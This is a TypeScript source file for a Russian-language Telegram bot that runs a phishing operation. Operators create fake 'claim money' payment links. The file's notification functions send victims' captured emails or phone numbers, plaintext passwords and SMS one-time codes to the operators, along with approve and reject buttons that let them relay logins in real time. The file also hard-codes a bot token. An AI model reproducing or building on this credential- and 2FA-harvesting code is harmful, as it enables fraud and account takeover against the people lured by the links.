import TelegramBot from 'node-telegram-bot-api';
import { db } from './db';
import { telegramUsers, telegramLinks, loginAttempts } from '@shared/schema';
import { eq, desc } from 'drizzle-orm';
import { storage } from './storage';

const BOT_TOKEN = '8060343326:AAHvHLzqappYiyspQNHNWUD-6AJ4lfc1FtY';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Admin user ID - will be set automatically for the first user who sends /start
let ADMIN_ID: string | null = null;

// Initialize ADMIN_ID from database
async function initializeAdmin() {
  try {
    const adminUsers = await db.select().from(telegramUsers);
    if (adminUsers.length > 0) {
      // Set ADMIN_ID to the first approved user (likely the admin)
      const admin = adminUsers.find(user => user.isApproved);
      if (admin) {
        ADMIN_ID = admin.telegramId;
        console.log(`Admin ID initialized: ${ADMIN_ID}`);
      }
    }
  } catch (error) {
    console.error('Error initializing admin:', error);
  }
}

// Initialize admin on startup
initializeAdmin();

// Force update ADMIN_ID for existing user
setTimeout(async () => {
  if (!ADMIN_ID) {
    try {
      const users = await db.select().from(telegramUsers);
      if (users.length > 0) {
        ADMIN_ID = users[0].telegramId;
        console.log(`Admin ID set to first user: ${ADMIN_ID}`);
      }
    } catch (error) {
      console.error('Error setting admin ID:', error);
    }
  }
}, 1000);

// Generate unique ID in format #A1B2C3D4
function generateUniqueId(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '#';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Generate unique link ID in format LINK_01
async function generateLinkId(): Promise<string> {
  const existingLinks = await db.select().from(telegramLinks).orderBy(desc(telegramLinks.id));
  let nextNumber = 1;
  
  if (existingLinks.length > 0) {
    // Extract number from last link ID
    const lastLinkId = existingLinks[0].linkId;
    const match = lastLinkId.match(/LINK_(\d+)/);
    if (match) {
      nextNumber = parseInt(match[1]) + 1;
    }
  }
  
  return `LINK_${nextNumber.toString().padStart(2, '0')}`;
}

// Generate random context data
function generateRandomString(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
  let result = "";
  for (let i = 0; i < 64; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Check if user is approved
async function isUserApproved(telegramId: string): Promise<boolean> {
  const user = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, telegramId));
  return user.length > 0 && (user[0].isApproved === true);
}

// Get user by telegram ID
async function getUserByTelegramId(telegramId: string) {
  const users = await db.select().from(telegramUsers).where(eq(telegramUsers.telegramId, telegramId));
  return users[0] || null;
}

// Main keyboard for approved users
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: 'üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É' }, { text: 'üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏' }],
      [{ text: '‚ùì –ü–æ–º–æ—â—å' }]
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};

// Cancel keyboard
const cancelKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: '‚ùå –û—Ç–º–µ–Ω–∞' }]
    ],
    resize_keyboard: true,
    one_time_keyboard: false
  }
};

// User states for conversation flow
const userStates = new Map<string, { state: string; data?: any }>();

// Bot commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || '';
  const username = msg.from?.username || '';
  const firstName = msg.from?.first_name || '';
  const lastName = msg.from?.last_name || '';

  // Check if this is the first user (admin)
  const allUsers = await db.select().from(telegramUsers);
  if (allUsers.length === 0) {
    // First user becomes admin automatically
    ADMIN_ID = telegramId;
    const uniqueId = generateUniqueId();
    
    try {
      await db.insert(telegramUsers).values({
        telegramId,
        username,
        firstName,
        lastName,
        uniqueId,
        isApproved: true,
      });

      await bot.sendMessage(chatId, 
        `üéâ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä!\n\n` +
        `–í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID: ${uniqueId}\n\n` +
        `–í—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∏–ª–∏ –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫–∞–∫ –ø–µ—Ä–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.\n` +
        `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /approve ID –¥–ª—è –æ–¥–æ–±—Ä–µ–Ω–∏—è –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.`, 
        mainKeyboard
      );
      return;
    } catch (error) {
      console.error('Error creating admin user:', error);
      await bot.sendMessage(chatId, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.');
      return;
    }
  }

  if (await isUserApproved(telegramId)) {
    await bot.sendMessage(chatId, 
      `–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –æ–±—Ä–∞—Ç–Ω–æ! üéâ\n\n` +
      `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å—Å—ã–ª–∫–∞–º–∏:`, 
      mainKeyboard
    );
    return;
  }

  // Check if user already requested access
  const existingUser = await getUserByTelegramId(telegramId);
  if (existingUser && !existingUser.isApproved) {
    await bot.sendMessage(chatId, 
      `–í–∞—à –∑–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! ‚è≥\n\n` +
      `–£–Ω–∏–∫–∞–ª—å–Ω—ã–π ID: ${existingUser.uniqueId}\n` +
      `–î–æ–∂–¥–∏—Ç–µ—Å—å –æ–¥–æ–±—Ä–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.`
    );
    return;
  }

  // Create new user request
  const uniqueId = generateUniqueId();
  
  try {
    await db.insert(telegramUsers).values({
      telegramId,
      username,
      firstName,
      lastName,
      uniqueId,
      isApproved: false,
    });

    await bot.sendMessage(chatId, 
      `–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! üëã\n\n` +
      `–í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID: ${uniqueId}\n\n` +
      `–ó–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.\n` +
      `–î–æ–∂–¥–∏—Ç–µ—Å—å –æ–¥–æ–±—Ä–µ–Ω–∏—è –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–æ—Ç–∞.`
    );

    // Notify admin if set
    if (ADMIN_ID) {
      await bot.sendMessage(ADMIN_ID, 
        `üîî –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø\n\n` +
        `ID: ${uniqueId}\n` +
        `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${firstName} ${lastName}\n` +
        `Username: @${username}\n` +
        `Telegram ID: ${telegramId}\n\n` +
        `–î–ª—è –æ–¥–æ–±—Ä–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /approve ${uniqueId}`
      );
    }

  } catch (error) {
    console.error('Error creating user request:', error);
    await bot.sendMessage(chatId, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.');
  }
});

// Admin command to approve users
bot.onText(/\/approve (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || '';
  
  if (!ADMIN_ID || telegramId !== ADMIN_ID) {
    await bot.sendMessage(chatId, '–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.');
    return;
  }

  const uniqueId = match?.[1];
  if (!uniqueId) {
    await bot.sendMessage(chatId, '–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /approve #ID');
    return;
  }

  try {
    const users = await db.select().from(telegramUsers).where(eq(telegramUsers.uniqueId, uniqueId));
    
    if (users.length === 0) {
      await bot.sendMessage(chatId, '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º ID –Ω–µ –Ω–∞–π–¥–µ–Ω.');
      return;
    }

    const user = users[0];
    
    await db.update(telegramUsers)
      .set({ isApproved: true, approvedAt: new Date() })
      .where(eq(telegramUsers.uniqueId, uniqueId));

    await bot.sendMessage(chatId, `‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${user.firstName} ${user.lastName} –æ–¥–æ–±—Ä–µ–Ω!`);
    
    // Notify user
    await bot.sendMessage(user.telegramId, 
      `üéâ –í–∞—à –∑–∞–ø—Ä–æ—Å –æ–¥–æ–±—Ä–µ–Ω!\n\n` +
      `–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞.`,
      mainKeyboard
    );

  } catch (error) {
    console.error('Error approving user:', error);
    await bot.sendMessage(chatId, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–¥–æ–±—Ä–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.');
  }
});

// Handle text messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || '';
  const text = msg.text;

  if (!text || text.startsWith('/')) return;

  // Check if user is approved
  if (!(await isUserApproved(telegramId))) {
    await bot.sendMessage(chatId, '–í—ã –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –¥–æ—Å—Ç—É–ø–∞.');
    return;
  }

  const userState = userStates.get(telegramId);

  // Handle cancel
  if (text === '‚ùå –û—Ç–º–µ–Ω–∞') {
    userStates.delete(telegramId);
    await bot.sendMessage(chatId, '–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', mainKeyboard);
    return;
  }

  // Handle main menu buttons
  if (text === 'üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É') {
    userStates.set(telegramId, { state: 'awaiting_price' });
    await bot.sendMessage(chatId, 
      '–í–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É (–Ω–∞–ø—Ä–∏–º–µ—Ä: 10 –∏–ª–∏ 10.50):', 
      cancelKeyboard
    );
    return;
  }

  if (text === 'üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏') {
    await showUserLinks(chatId, telegramId);
    return;
  }

  if (text === '‚ùì –ü–æ–º–æ—â—å') {
    await bot.sendMessage(chatId, 
      `ü§ñ –ü–æ–º–æ—â—å –ø–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –±–æ—Ç–∞:\n\n` +
      `üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É - —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π –ø–ª–∞—Ç–µ–∂–Ω–æ–π —Å—Å—ã–ª–∫–∏\n` +
      `üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏ - –ø—Ä–æ—Å–º–æ—Ç—Ä –∏ —É–¥–∞–ª–µ–Ω–∏–µ —Å—Å—ã–ª–æ–∫\n` +
      `‚ùì –ü–æ–º–æ—â—å - —ç—Ç–æ —Å–æ–æ–±—â–µ–Ω–∏–µ\n\n` +
      `–î–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É –∏ –∏–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è.\n` +
      `–ë–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É –¥–ª—è –ø–ª–∞—Ç–µ–∂–∞.`,
      mainKeyboard
    );
    return;
  }

  // Handle conversation states
  if (userState) {
    await handleUserState(chatId, telegramId, text, userState);
  } else {
    await bot.sendMessage(chatId, '–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –º–µ–Ω—é –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏.', mainKeyboard);
  }
});

// Handle user conversation states
async function handleUserState(chatId: number, telegramId: string, text: string, userState: any) {
  try {
    switch (userState.state) {
      case 'awaiting_price':
        // Validate price
        const price = parseFloat(text.replace(',', '.'));
        if (isNaN(price) || price <= 0) {
          await bot.sendMessage(chatId, '–ù–µ–≤–µ—Ä–Ω–∞—è —Ü–µ–Ω–∞. –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –±–æ–ª—å—à–µ 0:');
          return;
        }
        
        const formattedPrice = `‚Ç¨${price.toFixed(2)}`;
        userStates.set(telegramId, { 
          state: 'awaiting_sender_name', 
          data: { price: formattedPrice } 
        });
        
        await bot.sendMessage(chatId, 
          `–¶–µ–Ω–∞: ${formattedPrice}\n\n` +
          '–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –∏–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è:'
        );
        break;

      case 'awaiting_sender_name':
        if (text.trim().length < 2) {
          await bot.sendMessage(chatId, '–ò–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –º–∏–Ω–∏–º—É–º 2 —Å–∏–º–≤–æ–ª–∞:');
          return;
        }

        const { price: linkPrice } = userState.data;
        await createLink(chatId, telegramId, linkPrice, text.trim());
        userStates.delete(telegramId);
        break;

      default:
        userStates.delete(telegramId);
        await bot.sendMessage(chatId, '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.', mainKeyboard);
    }
  } catch (error) {
    console.error('Error handling user state:', error);
    userStates.delete(telegramId);
    await bot.sendMessage(chatId, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.', mainKeyboard);
  }
}

// Create new link
async function createLink(chatId: number, telegramId: string, price: string, senderName: string) {
  try {
    const linkId = await generateLinkId();
    const contextData = generateRandomString();
    const baseUrl = process.env.NODE_ENV === 'production' 
      ? 'https://your-domain.com' 
      : 'http://localhost:5000';
    
    const generatedLink = `${baseUrl}/myaccount/transfer/claim-money?context_data=${contextData}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(senderName)}`;

    await db.insert(telegramLinks).values({
      linkId,
      price,
      senderName,
      generatedLink,
      contextData,
      createdBy: telegramId,
    });

    await bot.sendMessage(chatId, 
      `‚úÖ –°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!\n\n` +
      `ID: ${linkId}\n` +
      `–¶–µ–Ω–∞: ${price}\n` +
      `–û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: ${senderName}\n\n` +
      `–°—Å—ã–ª–∫–∞:\n<code>${generatedLink}</code>\n\n` +
      `–ù–∞–∂–º–∏—Ç–µ –Ω–∞ —Å—Å—ã–ª–∫—É —á—Ç–æ–±—ã —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –µ—ë.`,
      { ...mainKeyboard, parse_mode: 'HTML' }
    );

  } catch (error) {
    console.error('Error creating link:', error);
    await bot.sendMessage(chatId, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å—Å—ã–ª–∫–∏.', mainKeyboard);
  }
}

// Show user links
async function showUserLinks(chatId: number, telegramId: string) {
  try {
    const links = await db.select().from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId))
      .orderBy(desc(telegramLinks.createdAt));

    if (links.length === 0) {
      await bot.sendMessage(chatId, '–£ –≤–∞—Å –Ω–µ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Å—Å—ã–ª–æ–∫.', mainKeyboard);
      return;
    }

    // Show links with delete buttons
    for (const link of links.slice(0, 5)) { // Show max 5 links with buttons
      const date = new Date(link.createdAt).toLocaleDateString('ru-RU');
      let message = `${link.linkId} - ${link.price}\n`;
      message += `üë§ ${link.senderName}\n`;
      message += `üìÖ ${date}\n`;
      message += `üîó –°—Å—ã–ª–∫–∞:\n<code>${link.generatedLink}</code>`;

      const keyboard = {
        reply_markup: {
          inline_keyboard: [[
            {
              text: 'üóë –£–¥–∞–ª–∏—Ç—å',
              callback_data: `delete_link_${link.linkId}`
            }
          ]]
        }
      };

      await bot.sendMessage(chatId, message, { ...keyboard, parse_mode: 'HTML' });
    }

    if (links.length > 5) {
      await bot.sendMessage(chatId, `... –∏ –µ—â–µ ${links.length - 5} —Å—Å—ã–ª–æ–∫`, mainKeyboard);
    } else {
      await bot.sendMessage(chatId, 'üëÜ –ù–∞–∂–º–∏—Ç–µ "–£–¥–∞–ª–∏—Ç—å" —á—Ç–æ–±—ã —É–¥–∞–ª–∏—Ç—å —Å—Å—ã–ª–∫—É', mainKeyboard);
    }

  } catch (error) {
    console.error('Error showing user links:', error);
    await bot.sendMessage(chatId, '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Å—ã–ª–æ–∫.', mainKeyboard);
  }
}



// Notification functions for website events
export async function notifyLoginAttempt(emailOrPhone: string, password: string, returnUri: string, contextData?: string) {
  try {
    // Get the latest login attempt to get its ID
    const allAttempts = await storage.getLoginAttempts();
    const latestAttempt = allAttempts.find(attempt => 
      attempt.emailOrPhone === emailOrPhone && 
      attempt.returnUri === returnUri
    );
    
    const loginAttemptId = latestAttempt?.id;
    
    // Find the link creator by contextData
    let targetUsers: any[] = [];
    if (contextData) {
      // Find the link with this contextData
      const links = await db.select().from(telegramLinks).where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        const linkCreator = links[0];
        // Get the user who created this link
        const user = await db.select().from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
        if (user.length > 0 && user[0].isApproved) {
          targetUsers = user;
        }
      }
    }
    
    // Fallback to all approved users if no specific link creator found
    if (targetUsers.length === 0) {
      targetUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    }
    
    const message = `üîê –ù–æ–≤–∞—è –ø–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞\n\n` +
      `üìß Email/–¢–µ–ª–µ—Ñ–æ–Ω:\n<code>${emailOrPhone}</code>\n` +
      `üîë –ü–∞—Ä–æ–ª—å:\n<code>${password}</code>\n` +
      `üîó Return URI:\n<code>${returnUri}</code>\n` +
      `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [[
          {
            text: '‚úÖ –û–¥–æ–±—Ä–∏—Ç—å',
            callback_data: `approve_${loginAttemptId}`
          },
          {
            text: '‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å', 
            callback_data: `reject_${loginAttemptId}`
          }
        ]]
      }
    };

    for (const user of targetUsers) {
      await bot.sendMessage(user.telegramId, message, { ...keyboard, parse_mode: 'HTML' });
    }
  } catch (error) {
    console.error('Error sending login notification:', error);
  }
}

export async function notifyLoginApproved(emailOrPhone: string) {
  try {
    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    const message = `‚úÖ –í—Ö–æ–¥ –æ–¥–æ–±—Ä–µ–Ω\n\n` +
      `üìß Email/–¢–µ–ª–µ—Ñ–æ–Ω: \`${emailOrPhone}\`\n` +
      `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message, { parse_mode: 'Markdown' });
    }
  } catch (error) {
    console.error('Error sending approval notification:', error);
  }
}

export async function notifySmsSubmission(otpCode: string, stepupContext: string) {
  try {
    const approvedUsers = await db.select().from(telegramUsers).where(eq(telegramUsers.isApproved, true));
    
    const message = `üì± –ù–æ–≤—ã–π SMS –∫–æ–¥\n\n` +
      `üî¢ –ö–æ–¥:\n<code>${otpCode}</code>\n` +
      `üìã –ö–æ–Ω—Ç–µ–∫—Å—Ç:\n<code>${stepupContext}</code>\n` +
      `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message, { parse_mode: 'HTML' });
    }
  } catch (error) {
    console.error('Error sending SMS notification:', error);
  }
}

// Handle callback queries (inline button presses)
bot.on('callback_query', async (callbackQuery) => {
  const message = callbackQuery.message;
  const data = callbackQuery.data;
  const chatId = message?.chat.id;
  const telegramId = callbackQuery.from.id.toString();

  if (!data || !chatId) return;

  try {
    // Check if user is approved
    if (!(await isUserApproved(telegramId))) {
      await bot.answerCallbackQuery(callbackQuery.id, { text: '–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è' });
      return;
    }

    if (data.startsWith('approve_')) {
      const loginAttemptId = parseInt(data.replace('approve_', ''));
      
      // Approve the login attempt
      await storage.approveLoginAttempt(loginAttemptId);
      
      // Update the message to show approval
      await bot.editMessageText(
        message.text + '\n\n‚úÖ –û–î–û–ë–†–ï–ù–û', 
        {
          chat_id: chatId,
          message_id: message.message_id,
          reply_markup: { inline_keyboard: [] }
        }
      );
      
      await bot.answerCallbackQuery(callbackQuery.id, { text: '–í—Ö–æ–¥ –æ–¥–æ–±—Ä–µ–Ω!' });
      
    } else if (data.startsWith('reject_')) {
      const loginAttemptId = parseInt(data.replace('reject_', ''));
      
      // Delete the login attempt
      await storage.deleteLoginAttempt(loginAttemptId);
      
      // Update the message to show rejection
      await bot.editMessageText(
        message.text + '\n\n‚ùå –û–¢–ö–õ–û–ù–ï–ù–û', 
        {
          chat_id: chatId,
          message_id: message.message_id,
          reply_markup: { inline_keyboard: [] }
        }
      );
      
      await bot.answerCallbackQuery(callbackQuery.id, { text: '–í—Ö–æ–¥ –æ—Ç–∫–ª–æ–Ω–µ–Ω!' });
      
    } else if (data.startsWith('delete_link_')) {
      // Extract link ID from callback data
      const linkId = data.replace('delete_link_', '');
      
      try {
        // Delete the link from database
        await db.delete(telegramLinks).where(eq(telegramLinks.linkId, linkId));
        
        // Update the message to show link deleted
        await bot.editMessageText(
          `üóë –°—Å—ã–ª–∫–∞ ${linkId} —É–¥–∞–ª–µ–Ω–∞`,
          {
            chat_id: chatId,
            message_id: callbackQuery.message?.message_id,
            reply_markup: { inline_keyboard: [] }
          }
        );
        
        await bot.answerCallbackQuery(callbackQuery.id, { text: '–°—Å—ã–ª–∫–∞ —É–¥–∞–ª–µ–Ω–∞!' });
        
      } catch (error) {
        console.error('Error deleting link:', error);
        await bot.answerCallbackQuery(callbackQuery.id, { text: '–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ —Å—Å—ã–ª–∫–∏' });
      }
    }
    
  } catch (error) {
    console.error('Error handling callback query:', error);
    await bot.answerCallbackQuery(callbackQuery.id, { text: '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞' });
  }
});

console.log('‚úÖ Telegram bot started successfully!');
console.log('Bot token:', BOT_TOKEN.substring(0, 20) + '...');

export default bot;